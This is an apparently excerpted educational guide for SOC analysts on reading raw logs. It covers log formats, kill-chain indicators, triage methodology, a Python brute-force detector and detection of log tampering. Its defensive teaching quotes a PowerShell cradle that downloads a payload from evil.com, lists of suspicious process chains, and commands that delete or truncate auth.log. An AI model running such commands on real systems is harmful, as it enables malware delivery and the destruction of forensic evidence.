## 1. What Are Raw Logs?
 
A **raw log** is an unprocessed, unfiltered record of an event generated by a system, application, device, or service. It is the original, machine-generated text before any SIEM normalization, parsing, or enrichment touches it.
 
```
          THE RAW LOG JOURNEY
          ─────────────────────────────────────────────────────────
 
  System generates event
          │
          ▼
  Raw log written to disk or sent over network   ← THIS is what we study
          │
          ▼
  SIEM collector receives raw log
          │
          ▼
  Parser extracts fields (normalization)
          │
          ▼
  Normalized event stored in SIEM index
          │
          ▼
  Analyst sees clean dashboard alert
```
 
**Why study raw logs if SIEM parses them?**
 
Because parsers can fail, fields can be misextracted, and the raw log is the **ground truth**. When an investigation gets complex, only the raw log tells the complete story. Knowing how to read raw logs is what separates a junior analyst from a senior one.

## 3. Anatomy of a Log Entry
 
Every log entry — regardless of source — contains some combination of these fundamental elements:
 
```
┌──────────────────────────────────────────────────────────────────────┐
│                    UNIVERSAL LOG ANATOMY                             │
├──────────────┬───────────────────────────────────────────────────────┤
│  ELEMENT     │  DESCRIPTION                      │  EXAMPLE          │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Timestamp   │  When did this happen?            │  2024-01-15       │
│              │  (timezone matters!)              │  T03:14:23.447Z   │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Hostname    │  Which machine generated this?    │  DC01.corp.local  │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Source      │  Which process/service wrote it?  │  sshd[1234]       │
│  Process     │                                   │  Microsoft-Audit  │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Severity    │  How important is this?           │  ERROR, WARNING   │
│  Level       │                                   │  INFO, DEBUG      │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Event ID /  │  What type of event is this?      │  4625, 22, 503    │
│  Event Code  │  (vendor-specific numeric code)   │                   │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Subject /   │  WHO performed the action?        │  admin, SYSTEM    │
│  Actor       │                                   │  john.doe@corp    │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Action /    │  WHAT was done?                   │  login, delete    │
│  Verb        │                                   │  connect, execute │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Object /    │  What was acted upon?             │  file.docx        │
│  Target      │                                   │  C:\Windows\...   │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Result /    │  Did it succeed or fail?          │  Success, Failure │
│  Outcome     │                                   │  Allow, Deny      │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Network     │  Source IP, Dest IP, Port,        │  192.168.1.50     │
│  Info        │  Protocol                         │  → 10.0.0.1:443  │
├──────────────┼───────────────────────────────────┼───────────────────┤
│  Additional  │  Vendor-specific context          │  User-Agent, PID  │
│  Context     │                                   │  CommandLine, etc │
└──────────────┴───────────────────────────────────┴───────────────────┘
```
 
### The Five Questions Every Log Should Answer
 
```
  WHEN?   → Timestamp (with timezone!)
  WHO?    → User, process, or source IP
  WHAT?   → Action taken (login, file access, connection)
  WHERE?  → Source machine, destination, file path
  HOW?    → Protocol, method, logon type, parameters
```

## 4. Log Formats You Must Know
 
### 4.1 Syslog (RFC 5424) — The Universal Standard
 
Syslog is the foundational log transport protocol used by almost all Unix/Linux systems, network devices, and appliances.
 
```
SYSLOG MESSAGE STRUCTURE:
─────────────────────────────────────────────────────────────────────
<PRIORITY>VERSION TIMESTAMP HOSTNAME APP-NAME PROCID MSGID MSG
 
EXAMPLE:
<34>1 2024-01-15T03:14:23.447Z server01 sshd 1234 - Failed password for invalid user root from 41.206.5.44 port 54321 ssh2
 
DECODED:
  <34>         = Priority (Facility=4 Auth, Severity=2 Critical)
                 Formula: Priority = (Facility × 8) + Severity
  1            = Syslog version
  2024-01-15..  = RFC3339 timestamp
  server01     = Hostname
  sshd         = Application name
  1234         = Process ID (PID)
  -            = Message ID (none)
  Failed...    = The actual log message
```
 
#### Syslog Facility Codes (What generated the log)
 
| Code | Facility | Common Source |
|------|----------|---------------|
| 0 | kern | Linux kernel |
| 1 | user | User-level messages |
| 4 | auth | Authentication (login, sudo) |
| 10 | authpriv | Auth private (PAM) |
| 16–23 | local0–local7 | Custom applications, network devices |
 
#### Syslog Severity Levels
 
| Level | Name | Meaning | SOC Action |
|-------|------|---------|-----------|
| 0 | EMERG | System is unusable | Immediate response |
| 1 | ALERT | Action must be taken now | Page on-call |
| 2 | CRIT | Critical condition | Urgent investigation |
| 3 | ERR | Error condition | Investigate |
| 4 | WARNING | Warning condition | Monitor |
| 5 | NOTICE | Normal but significant | Review |
| 6 | INFO | Informational | Log it |
| 7 | DEBUG | Debug-level detail | Development only |

### 4.2 CEF (Common Event Format)
 
Used by ArcSight and many security appliances:
 
```
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
 
EXAMPLE (Palo Alto Firewall):
CEF:0|Palo Alto Networks|PAN-OS|10.1|THREAT|threat|7|
  rt=1705282463000
  src=41.206.5.44
  dst=10.0.0.50
  spt=54321
  dpt=22
  proto=TCP
  act=drop
  cs1=block-malicious-ips
  cs1Label=RuleMatched
  msg=Threat detected: SSH brute force
 
DECODED FIELDS:
  rt      = Receipt time (epoch milliseconds)
  src     = Source IP
  dst     = Destination IP
  spt     = Source port
  dpt     = Destination port
  proto   = Protocol
  act     = Action taken (drop, allow, reset)
  cs1     = Custom string field 1
  msg     = Human-readable message
```

### 4.5 W3C Extended Log Format (IIS/Web)
 
```
#Version: 1.0
#Date: 2024-01-15 03:14:23
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-bytes cs-bytes time-taken
 
2024-01-15 03:14:23 10.0.0.10 GET /admin/login.php - 443 - 41.206.5.44 python-requests/2.28 401 1234 456 234
2024-01-15 03:14:24 10.0.0.10 GET /admin/login.php - 443 - 41.206.5.44 python-requests/2.28 401 1234 456 198
2024-01-15 03:14:25 10.0.0.10 POST /admin/login.php - 443 - 41.206.5.44 python-requests/2.28 200 5678 890 312
 
COLUMN BREAKDOWN:
  s-ip        = Server IP (10.0.0.10)
  cs-method   = HTTP method (GET, POST, PUT)
  cs-uri-stem = URL path (/admin/login.php)
  s-port      = Server port (443 = HTTPS)
  c-ip        = Client IP (41.206.5.44)
  cs(User-Agent) = Browser/tool used
  sc-status   = HTTP response code (401=Unauthorized, 200=OK)
  sc-bytes    = Bytes sent by server
  cs-bytes    = Bytes sent by client
  time-taken  = Request duration in milliseconds
```
 
**SOC Alert:** In this example — two 401s (failures) then a 200 (success) from same IP with scripted user agent = brute force that worked!

```
  - Parent: explorer.exe → cmd.exe is semi-normal (user opened cmd)
  - But then cmd.exe → powershell with -enc (encoded!) = SUSPICIOUS

  - In real attacks this decodes to: IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

```
──────────────────────────────────────────────────────────────────

  explorer.exe → chrome.exe → chrome.exe (tabs)
  explorer.exe → office.exe → winword.exe
  services.exe → svchost.exe

  winword.exe → cmd.exe          ← Macro executing commands

  outlook.exe → cmd.exe          ← Email attachment executing cmd

  svchost.exe → powershell.exe   ← Service-based execution (APT)
  wscript.exe → powershell.exe   ← VBScript dropper
  mshta.exe → powershell.exe     ← HTA to PS (LOLBin abuse)
  regsvr32.exe → network call    ← Squiblydoo technique
  certutil.exe (any)             ← Often used to download malware
  wmic.exe → cmd.exe → ...       ← WMI lateral movement
```

## 16. Reading Logs Like an Attacker Thinks
 
Understanding the attack lifecycle helps you know **where to look** in logs.
 
```
THE CYBER KILL CHAIN vs. WHERE TO FIND IT IN LOGS
──────────────────────────────────────────────────────────────────
 
PHASE 1: RECONNAISSANCE
What attacker does: Port scanning, web scraping, OSINT
Where to find it:
  → Firewall logs: many DENY entries from one source to many ports
  → Web logs: scanner User-Agent strings (Nikto, Nmap, masscan)
  → DNS logs: reverse DNS queries for your IP ranges
 
PHASE 2: WEAPONIZATION (happens on attacker's system)
What attacker does: Crafts malicious doc, builds payload
Where to find it: (Nothing in your logs at this stage)
 
PHASE 3: DELIVERY
What attacker does: Sends phishing email or exploits web app
Where to find it:
  → Email gateway logs: suspicious sender, attachment type
  → Web server logs: unusual POST to upload endpoint
  → Proxy logs: download of executable from external source
 
PHASE 4: EXPLOITATION
What attacker does: Malicious doc opens, exploit fires, code runs
Where to find it:
  → Windows Event Log 4688: process spawned by Office application
  → Sysmon Event 1: suspicious command line parameters
  → Windows Event Log 7045: new service installed
  → Windows Event Log 4698: new scheduled task created
 
PHASE 5: INSTALLATION (Persistence)
What attacker does: Drops backdoor, creates backdoor user
Where to find it:
  → Windows Event Log 4720: new user account created
  → Windows Event Log 4698: new scheduled task
  → Windows Event Log 7045: new service installed
  → Sysmon Event 12/13: registry run key modified
  → File system logs: new files in C:\Windows\Temp, ProgramData
 
PHASE 6: COMMAND & CONTROL (C2)
What attacker does: Malware beacons to attacker's server
Where to find it:
  → DNS logs: DGA domains, DNS tunneling, high NXDOMAIN rate
  → Proxy logs: regular beaconing pattern, unusual user-agents
  → Firewall logs: outbound to known bad IPs on unusual ports
  → NetFlow: small regular connections to external IPs
 
PHASE 7: ACTIONS ON OBJECTIVES (Exfiltration, Ransomware)
What attacker does: Steals data, encrypts files, destroys evidence
Where to find it:
  → Proxy/Firewall: large outbound data transfers
  → File server logs: mass file access then rename
  → Windows Event Log 1102: security log cleared (covering tracks)
  → Windows Event Log 4688: vssadmin delete shadows (ransomware)
  → Sysmon Event 23: bulk file deletion
```

## 18. Log Analysis Methodology
 
### The SOC Analyst's Systematic Approach
 
```
STEP 1 — TRIAGE: Get your bearings
──────────────────────────────────────────────────────────────────
Questions to answer first:
  □ When did this start? (Earliest relevant timestamp)
  □ Which systems are involved? (Source, destination, pivot points)
  □ What triggered the initial alert?
  □ Is this still ongoing or historical?
 
STEP 2 — SCOPE: Understand the blast radius
──────────────────────────────────────────────────────────────────
  □ How many systems are affected?
  □ Is there lateral movement? (Same attacker on multiple hosts)
  □ What data could have been accessed?
  □ Are any critical systems (DC, DB, mail) involved?
 
STEP 3 — PIVOT: Follow the thread
──────────────────────────────────────────────────────────────────
From an IP → What else did this IP do? (All log sources)
From a user → What did this user access?
From a process → What did it spawn? What network calls did it make?
From a file → Who accessed it? Who modified it?
From a domain → Who queried it? When?
 
STEP 4 — TIMELINE: Build the story
──────────────────────────────────────────────────────────────────
Sort all relevant events by timestamp.
Build a narrative: what happened first, second, third...
Identify the initial access vector (HOW did they get in?)
 
STEP 5 — CLASSIFY: True Positive or False Positive?
──────────────────────────────────────────────────────────────────
True Positive:   Real attack. Escalate. Initiate IR.
False Positive:  Benign activity. Document. Tune rule.
Benign True:     Weird but authorized (change management).
Unknown:         Need more info. Escalate to Tier 2.
 
STEP 6 — DOCUMENT: Leave a trail
──────────────────────────────────────────────────────────────────
  □ What you found in logs (with timestamps and quotes)
  □ What you searched and didn't find (proves you checked)
  □ Your conclusion and confidence level
  □ Recommended actions
```

```python
#!/usr/bin/env python3
"""
Quick-and-dirty brute force detector from auth.log
SOC Tool — Raw Log Analysis
"""
import re
from collections import defaultdict
from datetime import datetime
 
THRESHOLD = 5        # Failures per IP to alert
TIME_WINDOW = 60     # Seconds
 
failures = defaultdict(list)
 
with open('/var/log/auth.log', 'r') as f:
    for line in f:
        # Parse failed SSH attempts
        match = re.search(
            r'(\w+ \d+ \d+:\d+:\d+).*Failed password.*from (\d+\.\d+\.\d+\.\d+)',
            line
        )
        if match:
            timestamp_str, ip = match.groups()
            timestamp = datetime.strptime(timestamp_str, '%b %d %H:%M:%S')
            failures[ip].append(timestamp)
 
# Analyze for brute force
print(f"{'IP Address':<20} {'Failures':<10} {'Status'}")
print("-" * 50)
for ip, times in sorted(failures.items(), key=lambda x: len(x[1]), reverse=True):
    count = len(times)
    status = "🚨 BRUTE FORCE!" if count >= THRESHOLD else "OK"
    print(f"{ip:<20} {count:<10} {status}")
```

## 20. Common Log Analysis Mistakes
 
```
MISTAKE 1: IGNORING TIMEZONE DIFFERENCES
──────────────────────────────────────────────────────────────────
Firewall says attack at 03:00 UTC
Windows log says suspicious login at 06:00 — looks 3 hours later
Actually they're the SAME EVENT — Windows was in UTC+3!
 
FIX: Always normalize all logs to UTC before building timelines.
Check: date -u on Linux, Windows "Time Zone" in system settings
 
 
MISTAKE 2: TRUSTING THE HOSTNAME FIELD
──────────────────────────────────────────────────────────────────
Log shows: "Workstation: ADMIN-PC"
Analyst assumes: "Must be the admin's computer"
Reality: Attacker forged the workstation name field (it's user-supplied!)
 
FIX: Always cross-reference hostname with source IP → DHCP logs to verify
     actual machine. IP is harder to forge than hostname.
 
 
MISTAKE 3: LOOKING AT EVENTS IN ISOLATION
──────────────────────────────────────────────────────────────────
Alert: Failed login from 41.206.5.44 (Low severity — common)
Analyst closes it as noise
Reality: 5 minutes earlier, same IP successfully logged into VPN
         Then a minute later, logged into the domain controller
 
FIX: Always search for ALL activity from an IP/user ±1 hour around the alert.
     Context makes noise into signal.
 
 
MISTAKE 4: NOT CHECKING FOR LOG GAPS
──────────────────────────────────────────────────────────────────
Analyst: "I see nothing suspicious from 02:00 to 04:00"
Reality: Log source went silent at 02:00 — attacker cleared the logs
         or disconnected the log shipping agent!
 
FIX: Monitor log ingestion rates. Alert when a source goes silent.
     Check EventID 1102 (log cleared) and 4719 (audit policy changed).
 
 
MISTAKE 5: IGNORING FAILED → SUCCESS TRANSITION
──────────────────────────────────────────────────────────────────
Common mistake: "50 failed logins — probably scripted noise"
Reality: At failed login #51 → SUCCESS! Brute force worked.
 
FIX: Always correlate failures with successes from same source.
     The success after many failures is the most important event.
 
 
MISTAKE 6: FORGETTING ABOUT LEGITIMATE SOURCES OF NOISE
──────────────────────────────────────────────────────────────────
"300 failed logins from 10.0.0.1 — that's our scanner!"
Reality: Sometimes it is. But threat actors HIDE BEHIND legitimate tools.
         What if someone compromised the scanner host?
 
FIX: Baseline legitimate sources but don't blindly whitelist.
     Monitor WHAT the legitimate scanner is connecting to.
 
 
MISTAKE 7: ANALYZING ONLY THE ALERTED SYSTEM
──────────────────────────────────────────────────────────────────
Alert: Malware on WORKSTATION-04
Analyst investigates only WORKSTATION-04
 
Reality: Attacker was on WORKSTATION-04 for 3 hours.
         In that time, they SSH'd to 5 servers and exfiltrated from a 6th.
 
FIX: "Assume breach is wider." Always search other systems for the same
     IOCs. Check: same process hashes, same source IP, same username.
```

## 21. Log Integrity and Tampering Detection
 
Attackers try to delete or modify logs to hide their tracks. You need to detect this.
 
```
HOW ATTACKERS TAMPER WITH LOGS
──────────────────────────────────────────────────────────────────
1. Clear Windows Security log     → EventID 1102 (tells you it was cleared)
2. Disable audit policy           → EventID 4719 (tells you it was disabled)
3. Delete Linux log files         → rm /var/log/auth.log (file gone!)
4. Truncate log files             → cat /dev/null > auth.log (file empty)
5. Kill log shipping agent        → Process termination in Sysmon
6. Overwrite specific lines       → Hex editor, timestamps break
7. Block log destination (SIEM)   → Firewall rule to drop log traffic
 
HOW TO DETECT TAMPERING
──────────────────────────────────────────────────────────────────
1. GAP DETECTION:
   If logs from a host go from 10,000 events/hour to 0 → tampered or dead
   SIEM health monitoring alerts on this
 
2. EVENTID 1102 / EventID 104:
   EventID 1102 = Security log cleared (Windows Security channel)
   EventID 104  = System log cleared (Windows System channel)
   These events are generated EVEN WHEN YOU CLEAR THE LOG — ironic but true
 
3. FILE INTEGRITY MONITORING (FIM):
   Monitor /var/log/* files for deletion or truncation
   Tripwire, OSSEC, Wazuh all do this
 
4. FORWARD LOGS IMMEDIATELY:
   Best defense — send logs to SIEM in real-time, not in batches
   If attacker deletes local logs, SIEM already has them
 
5. IMMUTABLE LOG STORAGE:
   AWS S3 with Object Lock (WORM)
   Azure Immutable Blob Storage
   Once written, cannot be modified or deleted for retention period
 
6. LOG SIGNING:
   Some systems support cryptographic signing of log entries
   Any modification breaks the hash chain
   Syslog-ng and rsyslog support TLS-signed log forwarding
 
7. WINDOWS EVENT FORWARDING (WEF):
   Push Windows logs to a central collector immediately
   Even if attacker clears local log, collected version persists
```
